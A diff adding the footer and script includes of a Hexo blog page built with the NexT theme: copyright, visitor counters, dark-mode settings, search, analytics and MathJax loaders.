+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">diffany</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://unpkg.com/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://unpkg.com/@next-theme/pjax@0.6.0/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous"></script>
+
+
+  <script src="[object Object]"></script>
+  <script src="/%5Bobject%20Object%5D"></script>
+  <script src="/%5Bobject%20Object%5D"></script>
+
+
+<script>
+var options = {
+  bottom: '64px', // default: '32px'
+  right: 'unset', // default: '32px'
+  left: '32px', // default: 'unset'
+  time: '0.5s', // default: '0.3s'
+  mixColor: '#fff', // default: '#fff'
+  backgroundColor: '#fff',  // default: '#fff'
+  buttonColorDark: '#100f2c',  // default: '#100f2c'
+  buttonColorLight: '#fff', // default: '#fff'
+  saveInCookies: true, // default: true,
+  label: '🌓', // default: ''
+  autoMatchOsTheme: true // default: true
+}
+const darkmode = new Darkmode(options);
+darkmode.showWidget();
+</script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/pjax.js"></script>
+
+  <script src="https://unpkg.com/hexo-generator-searchdb@1.4.1/dist/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+  <script class="next-config" data-name="leancloud_visitors" type="application/json">{"enable":true,"app_id":"ImshWy4c6kiRqFukNXuAeVYt-gzGzoHsz","app_key":"I15dpBmlxhPPxNgS0pn9Fer5","server_url":null,"security":false}</script>
+  <script src="/js/third-party/statistics/lean-analytics.js"></script>
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">false</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"all","js":{"url":"https://unpkg.com/mathjax@3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+
+</body>
+</html>
